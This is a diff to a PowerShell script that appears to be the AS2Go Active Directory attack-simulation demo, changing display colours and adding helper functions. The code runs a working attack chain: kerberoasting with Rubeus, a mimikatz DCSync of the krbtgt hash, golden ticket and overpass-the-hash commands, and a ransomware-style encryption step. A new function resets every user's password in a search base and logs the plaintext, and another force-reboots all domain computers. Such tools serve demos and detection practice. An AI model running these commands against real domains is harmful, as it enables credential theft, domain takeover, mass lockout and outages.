@@ -129,13 +129,12 @@ $global:BDUser = ""
 $global:BDCred = ""
 
 
-#Color Schema for the next command
-$fgcS = "DarkGray" # Switch
+$fgcS = "Gray" # Switch - DarkGray
 $fgcC = "Yellow"   # Command
-$fgcV = "DarkCyan" # Value
-[string] $fgcF = (get-host).ui.rawui.ForegroundColor
-If ($fgcF-eq "-1") {$fgcF = "White"}
+$fgcV = "Cyan" # Value
+$fgcF = "White"
 $fgcH = "Yellow" 
+
 
 $WinVersion = [System.Environment]::OSVersion.Version.ToString()
 
@@ -174,6 +173,126 @@ function MyTemplate {
 
     return $true
 }
+
+
+function Get-ComputerInformation {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####    Description                ######                                 
+    #####                                                                      #####
+    ################################################################################
+
+
+    Param([string] $computer)
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+
+    $property = Get-ADComputer -Identity  $computer -Properties name,operatingSystem, operatingSystemVersion
+    
+    $Name = $property.name.PadRight(16,[char]32)
+    $prefix = $property.operatingSystem.PadRight(33,[char]32)
+    $suffix = $property.operatingSystemVersion
+
+    $summary = "$Name | $prefix | $suffix"
+
+
+    Write-Log -Message "    >> using $summary"
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+
+    return $summary
+}
+
+Function Reset-Password {
+
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####    Description                                                       ######                                 
+    #####                                                                      #####
+    ################################################################################
+    Param([string] $Domain, [string] $Password, [string] $SearchBase, [string] $NoR)
+
+
+    $error = ""
+    $myfunction = Get-FunctionName
+    
+
+    $SecurePass = ConvertTo-SecureString -String $Password -AsPlainText -Force
+    Write-Log -Message "### Start Function $myfunction ###"
+
+    If ($DeveloperMode) {
+        $ADUSers = Get-ADUser -Filter * -SearchBase $SearchBase | Sort-Object { Get-Random } | Select-Object -First 300
+    }
+    else {
+        $ADUSers = Get-Aduser -filter * -SearchBase $SearchBase
+    }
+
+    $Step = 0
+    $TotalSteps = $ADUsers.Count
+  
+    [bool] $StopRPw = $false
+        
+    Foreach ($ADUSer in $ADUsers) {
+        $Step += 1
+        $user = $Domain + "\" + $ADUSer.samaccountname
+        $progress = [int] (($Step) / $TotalSteps * 100)
+        Write-Progress -Id 0 -Activity "Reset the password from user $User" -status "Completed $progress % of resetting passwords!" -PercentComplete $progress         
+        
+        Try
+        {
+           Set-ADAccountPassword -Identity $ADUSer.samaccountname -Reset -NewPassword $SecurePass -ErrorAction stop
+        }
+        catch
+        {
+          $error
+          $StopRPw  = $true
+        }
+       
+       #If ($StopRPw  = $true) {break}
+           
+    }
+
+    # close the process bar
+    Start-Sleep 1
+    Write-Progress -Activity "Reset the password from user $User" -Status "Ready" -Completed
+    Write-Log -Message "    >> using: $Password"
+    #####
+    Write-Log -Message "### End Function $myfunction ###"
+}
+
+
+function Set-StandCommandColors {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####    Description                ######                                 
+    #####                                                                      #####
+    ################################################################################
+
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+
+    #Color Schema for the next command
+    $fgcS = "DarkGray" # Switch
+    $fgcC = "Yellow"   # Command
+    $fgcV = "DarkCyan" # Value
+    [string] $fgcF = (get-host).ui.rawui.ForegroundColor
+    If ($fgcF-eq "-1") {$fgcF = "White"}
+    $fgcH = "Yellow" 
+
+    Write-Log -Message "    >> using $CAtemplate"
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+
+    return $true
+}
+
 
 function Get-ADGroupNameBasedOnSIDSuffix {
 
@@ -567,8 +686,8 @@ function Start-KerberoastingAttack {
     $answer = Get-Answer -question $question -defaultValue $No
 
     If ($answer -eq $yes) {   
-        if (Test-Path $hashes) {Remove-Item $hashes}
-        Invoke-Command -ScriptBlock {.\Rubeus.exe kerberoast /domain:$myDomain /outfile:.\$hashes}
+        #if (Test-Path $hashes) {Remove-Item $hashes}
+        Invoke-Command -ScriptBlock {.\Rubeus.exe kerberoast /domain:$myDomain /outfile:.\$hashes} | Out-Host
         Invoke-Item .\$hashes
     
         pause
@@ -822,12 +941,12 @@ function SimulateRansomare {
         Write-Host "`n"
         pause
     
-        Confirm-FileAvailabliy -filename "AS2Go-Encryption.ps1"
+        Get-FileVersion -filename "AS2Go-Encryption.ps1"
         .\AS2Go-Encryption.ps1 -share $FolderToEncrypt
     
         Write-host "`nAmong others, the following file has been encrypted" -ForegroundColor $global:FGCHighLight | Out-Host
         Write-host "`  --> $FolderToEncrypt\$filePrefix.txt" -ForegroundColor $global:FGCHighLight | Out-Host
-        #Invoke-Item "$FolderToEncrypt\$filePrefix.txt"   
+        Invoke-Item "$FolderToEncrypt\$filePrefix.txt"   
     }
 
 
@@ -897,7 +1016,7 @@ Function New-GoldenTicket{
     }
     else {
         $sFakeUser = $env:USERNAME
-        #$sFakeUser = "Administrator"
+        $sFakeUser = "Administrator"
     }
 
     Clear-Host
@@ -908,16 +1027,11 @@ Function New-GoldenTicket{
     Write-Host      -NoNewline "  Command: "
     Write-Highlight -Text ".\mimikatz.exe ", """log .\", $sFakeUser, ".log",""" ""lsadump::","dcsync", " /domain:",$fqdn, " /user:","krbtgt", """ ""exit"""   `
                 -Color $fgcC, $fgcS, $fgcV, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcS
-    
-    
-
-#    Write-Host "mimikatz.exe ""log .\$sFakeUser.log"" ""lsadump::dcsync /domain:$fqdn /user:krbtgt""  ""exit""`n" -ForegroundColor $global:FGCCommand
         
     $question = "Do you want to run this step - Y or N? Default "
     $answer = Get-Answer -question $question -defaultValue $Yes
     If ($answer -eq $yes) {
         Invoke-Command -ScriptBlock { .\mimikatz.exe "log .\$sFakeUser.log" "lsadump::dcsync /domain:$fqdn /user:krbtgt"  "exit" }
-        # Invoke-Command -ScriptBlock {}
         Invoke-Item ".\$sFakeUser.log"
         Pause
     }
@@ -945,27 +1059,14 @@ Function New-GoldenTicket{
            
     } Until ($prompt -eq $yes)
 
-    ####  delete #################
-Clear-Host
-$fgcS = "DarkGray" # Switch
-$fgcC = "Yellow"   # Command
-$fgcV = "Cyan"     # Value
-$fqdn = "da-herrhozi"
-$domainsID = "da-herrhozi.pfx"
-$krbtgtntml = "da-herrhozi.pem"
-$domainsID = "da-herrhozi.pfx"
-$sFakeUser = "da-herrhozi.pem"
-####  delete #################
-
 
 # example: .\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$fqdn /sid:$domainsID /rc4:$krbtgtntml /user:$sFakeUser /id:500 /groups:500,501,513,512,520,518,519 /ptt" "exit"
+Write-Host ""
 Write-Host      -NoNewline "  Command: "
 Write-Highlight -Text ".\mimikatz.exe ", """privilege::debug"" ""kerberos::purge"" ""kerberos::","golden", " /domain:", $fqdn, " /sid:",$domainsID, " /rc4:",$krbtgtntml, " /user:",$sFakeUser, " /id:", "500", "/groups:", "500,501,513,512,520,518,519", "/ptt"" ""exit"""  `
                 -Color $fgcC, $fgcS,$fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
         
-    #Write-Host "`n NEXT STEP: " -NoNewline
-    #Write-Host "mimikatz.exe ""privilege::debug"" ""kerberos::purge"" ""kerberos::golden /domain:$fqdn /sid:$domainsID /rc4:$krbtgtntml /user:$sFakeUser /id:500 /groups:500,501,513,512,520,518,519 /ptt""  ""exit""`n" -ForegroundColor $global:FGCCommand
-        
+       
     $question = "Do you want to run this step - Y or N? Default "
     $answer = Get-Answer -question $question -defaultValue $Yes
         
@@ -1017,22 +1118,19 @@ function Restart-VictimMachines {
     Write-Host "       TRY to reboot the following computers                         "
     Write-Host "____________________________________________________________________`n`n" 
 
-    Get-ADComputer -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties * | Select-Object -Property Name, DNSHostName, Enabled, LastLogonDate, operatingSystem | Format-Table
-
-
+    Get-ADComputer -Filter * -Properties LastLogonTimeStamp, lastlogonDate, operatingSystem | Where-Object { $_.LastLogonTimeStamp  -gt 1000 } | format-table DNShostname, operatingSystem, Enabled, lastlogonDate -autosize
+    
     $commment = "Use case $UseCase | Your network was hacked. All machines will be rebooted in $time2reboot seconds!!!!"
 
-
-    Write-Host "`nusing: shutdown /r /f /c $commment /t $time2reboot /m \\<remotemachine>`n"
-
+    write-host ""
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text "shutdown ", "/r /f /t ", "$time2reboot ", "/c ", "$commment"  `
+                    -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV
+    Write-Host  ""   
 
     # enumerate all enabled computer accounts 
-    $computers = Get-ADComputer -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties * | Select-Object -Property Name, DNSHostName, Enabled, LastLogonDate, operatingSystem
+    $computers = Get-ADComputer -Filter * -Properties LastLogonTimeStamp, lastlogonDate, operatingSystem | Where-Object { $_.LastLogonTimeStamp  -gt 1000 } | Select-Object -Property Name, DNSHostName, Enabled, LastLogonDate, operatingSystem
     pause
-
-    # check if the computer is online
-    #$time2reboot = 99
-    #$UseCase = "TEST"
 
 
     foreach ( $computer in $computers) {
@@ -1068,8 +1166,6 @@ function Restart-VictimMachines {
 
     # last, but not least
     shutdown /r /f /c $commment /t $time2reboot /m \\$env:COMPUTERNAME
-
-
 
     #####
     Write-Log -Message "### End Function $myfunction ###"
@@ -1175,9 +1271,12 @@ function Start-UserManipulation {
     If ($answer -eq $yes) {
         $attributes = @("name", "samaccountname", "Enabled", "passwordlastset", "whenChanged")
         $StartDate = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
-        $newRandomPW = Get-RandomPassword
         $SecurePass = ConvertTo-SecureString -String $newRandomPW -AsPlainText -Force
+
+        $MyDomain = $env:USERDNSDOMAIN
+        Reset-Password -Domain $MyDomain -Password $newRandomPW -SearchBase $MySearchBase -NoR 3
     
+        <# 
         If ($DeveloperMode) {
             #First find a random char
             Do {
@@ -1189,13 +1288,16 @@ function Start-UserManipulation {
             Write-Log -Message "will reset users password whose names begin with an $NamePrefix"
         }
         else {
-            get-aduser -filter * -SearchBase $MySearchBase | Set-ADAccountPassword -Reset -NewPassword $SecurePass
+            #get-aduser -filter * -SearchBase $MySearchBase | Set-ADAccountPassword -Reset -NewPassword $SecurePass
+            $MyDomain = $env:USERDNSDOMAIN
+            Reset-Password -Domain $MyDomain -Password $newRandomPW -SearchBase $MySearchBase -NoR 3
+            
         }
-
+#>
         Write-Host ""     
   
-        Get-ADUser -filter * -SearchBase $MySearchBase  -Properties $attributes | Select-Object $attributes | Sort-Object "passwordlastset" | Format-Table
-        Get-ADUser -filter * -SearchBase $MySearchBase  -Properties $attributes | Select-Object $attributes | Select-Object -First 2  | Sort-Object "passwordlastset" | Format-Table
+        Get-ADUser -filter * -SearchBase $MySearchBase  -Properties $attributes | Select-Object $attributes | Select-Object -First 100 | Sort-Object "passwordlastset" | Format-Table
+       # Get-ADUser -filter * -SearchBase $MySearchBase  -Properties $attributes | Select-Object $attributes | Select-Object -First 2  | Sort-Object "passwordlastset" | Format-Table
   
         $EndDate = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
         $duration = NEW-TIMESPAN –Start $StartDate –End $EndDate
@@ -1407,7 +1509,11 @@ function Start-Exfiltration {
     write-host ""
     write-host ""
     write-host " Try to find some sensitive data, e.g. files with passwords" 
-    write-host " more C:\temp\as2go\my-passwords.txt`n" -ForegroundColor $global:FGCCommand
+    Write-Host ""
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text "more ", "C:\temp\as2go\my-passwords.txt" `
+                    -Color $fgcC, $fgcV
+    Write-Host ""
 
     Pause
     Clear-Host
@@ -1472,29 +1578,25 @@ Set-NewBackgroundColor -BgC "Blue" -FgC "White"
 
 
     If ($NewStage -eq $PtH) {
+        
         $global:FGCCommand = "Green"
         $global:FGCQuestion = "Yellow"
-        $global:FGCHighLight = "Yellow"
+        $global:FGCHighLight = "Darkblue"
         $global:FGCError = "DarkBlue"
-
-#Color Schema for the next command
-      $fgcS = "Black" # Switch
-      $fgcC = "Yellow"   # Command
-
-[string] $fgcF = (get-host).ui.rawui.ForegroundColor
-If ($fgcF-eq "-1") {$fgcF = "White"}
-
-$fgcV = $fgcF # Value
-     $fgcH = "Yellow" 
-
+        
         Set-NewBackgroundColor -BgC "DarkBlue" -FgC "White"
-        Set-NewBackgroundColor -BgC "DarkGray" -FgC "White"
+
+#      Write-Host -BackgroundColor 
+
+
     }
     elseif ($NewStage -eq $PtT) {
+        
         $global:FGCCommand = "Green"
         $global:FGCQuestion = "Yellow"
         $global:FGCHighLight = "Yellow"
         $global:FGCError = "Red"
+        
         Set-NewBackgroundColor -BgC "Black" -FgC "White"
     }
     elseif ($NewStage -eq $GoldenTicket) {
@@ -1502,6 +1604,7 @@ $fgcV = $fgcF # Value
         $global:FGCQuestion = "Yellow"
         $global:FGCHighLight = "Yellow"
         $global:FGCError = "Black"
+        
         Set-NewBackgroundColor -BgC "DarkRed" -FgC "White"
     }
     else {
@@ -1918,8 +2021,8 @@ function Start-PtH-Attack {
         Write-Host "                   overpass-the-Hash 'PtH' attack                   "
         Write-Host "____________________________________________________________________`n" 
         Write-Host ""
-        Write-Host "  Compromised User Account - " -NoNewline; Write-Host $helpdeskuser -ForegroundColor $global:FGCHighLight
-        Write-Host "  NTML Hash                - " -NoNewline; Write-Host $pthntml      -ForegroundColor $global:FGCHighLight
+        Write-Host "  Compromised User Account - " -NoNewline; Write-Host $helpdeskuser -ForegroundColor $fgcC
+        Write-Host "  NTML Hash                - " -NoNewline; Write-Host $pthntml      -ForegroundColor $fgcC
         Write-Host ""
         Write-Host      -NoNewline "  Command: "
         Write-Highlight -Text ".\mimikatz.exe ", """privilege::","debug", """ ""sekurlsa::","pth", " /user:", $helpdeskuser , " /ntlm:", $pthntml, " /domain:", $fqdn,""" ""exit"""   `
@@ -2094,6 +2197,8 @@ function Start-PtT-Attack {
     write-host ""
     Set-KeyValue -key "LastStage" -NewValue $PtT
     Set-NewColorSchema -NewStage $PtT
+
+    
     klist
     Pause
     Clear-Host
@@ -2321,7 +2426,7 @@ Function Show-Step {
 
 }
 
-function Confirm-FileAvailabliy {
+function Get-FileVersion{
 
     [CmdletBinding()]
     Param(
@@ -2404,6 +2509,8 @@ function Confirm-PoSHModuleAvailabliy {
 
 Function Start-AS2GoDemo {
 
+
+
     Write-Log -Message "."
     Write-Log -Message "."
     Write-Log -Message "##################################################################"
@@ -2423,22 +2530,21 @@ Function Start-AS2GoDemo {
     $GroupGPO   = Get-ADGroupNameBasedOnSIDSuffix -sIDSuffix "-520"
 
     # check the correct directory and requirements
-    $FileVersionA = Confirm-FileAvailabliy -filename "AS2Go.xml"
-    $FileVersionM = Confirm-FileAvailabliy -filename "mimikatz.exe"
-    $FileVersionP = Confirm-FileAvailabliy -filename "PsExec.exe"
-    $FileVersionR = Confirm-FileAvailabliy -filename "Rubeus.exe"
-    $FileVersionN = Confirm-FileAvailabliy -filename "NetSess.exe"
-    $FileVersionC = Confirm-FileAvailabliy -filename "Certify.exe"
-    $FileVersionO = Confirm-FileAvailabliy -filename "..\..\Program Files\OpenSSL-Win64\bin\openssl.exe"
+    $FileVersionA = Get-FileVersion -filename "AS2Go.xml"
+    $FileVersionM = Get-FileVersion -filename "mimikatz.exe"
+    $FileVersionP = Get-FileVersion -filename "PsExec.exe"
+    $FileVersionR = Get-FileVersion -filename "Rubeus.exe"
+    $FileVersionN = Get-FileVersion -filename "NetSess.exe"
+    $FileVersionC = Get-FileVersion -filename "Certify.exe"
+    $FileVersionO = Get-FileVersion -filename "..\..\Program Files\OpenSSL-Win64\bin\openssl.exe"
 
     Confirm-PoSHModuleAvailabliy -PSModule "ActiveDirectory"
     Import-Module ActiveDirectory
 
-
     $demo = Get-KeyValue -key "DemoTitle"
     Update-WindowTitle -NewTitle $demo
 
-    Clear-Host
+   # Clear-Host
     Set-NewColorSchema -NewStage $PtT
 
     $laststage = Get-KeyValue -key "LastStage"
@@ -2604,7 +2710,7 @@ Function Start-AS2GoDemo {
     }
     else {
         $MyInfo = "          Still using these three (3) user accounts                    "
-        $MyFGC = "White"
+        $MyFGC = "Darkblue"
 
         If ($DeveloperMode) {
   
@@ -2637,17 +2743,23 @@ Function Start-AS2GoDemo {
     $domainadmin = "DA-$suffix"
 
 
-    Write-Host ""
-    Write-Host "  Compromised User Account  --  " -NoNewline
-    Write-Host                                  $victim -ForegroundColor $MyFGC       
-    Write-Host "  Helpdesk User             --  $helpdeskuser"
-    Write-Host "  Domain Admin              --  $domainadmin"
+        Write-Host ""
+        Write-Host "  Compromised Account  --  " -NoNewline
+        Write-Host                                  $victim -ForegroundColor $fgcC       
+        Write-Host "  Helpdesk User        --  $helpdeskuser"
+        Write-Host "  Domain Admin         --  $domainadmin"
 
     If ($Begin -eq $yes) {
+        
+        
+        $infoV = Get-ComputerInformation -computer $myViPC
+        $infoS = Get-ComputerInformation -computer $mySAW
+        $infoD = Get-ComputerInformation -computer $myDC
+        
         Write-Host ""
-        Write-Host "  Victim Maschine           --  $myViPC - Version $WinVersion"
-        Write-Host "  Admin Maschine            --  $mySAW" 
-        Write-Host "  Domain Controller         --  $myDC" 
+        Write-Host "  Victim Maschine      --  $infoV"
+        Write-Host "  Admin Maschine       --  $infoS" 
+        Write-Host "  Domain Controller    --  $infoD" 
    
         try {
             Write-Output $helpdeskuser | Set-Clipboard
@@ -2675,8 +2787,10 @@ Function Start-AS2GoDemo {
         #Restart-VictimMachines
         Write-host "START Run directy" -ForegroundColor Red
 
-        #Get-KerberosTGT -pfxFile "da-20221102.pfx" -altname "da-herrhozi"
 
+        #Restart-VictimMachines
+
+        
         #write-host $mydebug
 
         #Invoke-Command -ScriptBlock {.\certify.exe find /vulnerable}
@@ -2721,6 +2835,12 @@ Function Start-AS2GoDemo {
             $LateralMovement = $PtT
             $reconnaissance = $yes
             Set-NewColorSchema -NewStage $PtH
+            #Color Schema for the next command
+            #$fgcS = "Black" # Switch
+            #$fgcC = "Darkblue"   # Command
+            #$fgcF = "Black"
+            #$fgcV = "DarkMagenta" # Value
+            #$fgcH = "Darkblue" 
         }
         else {
     
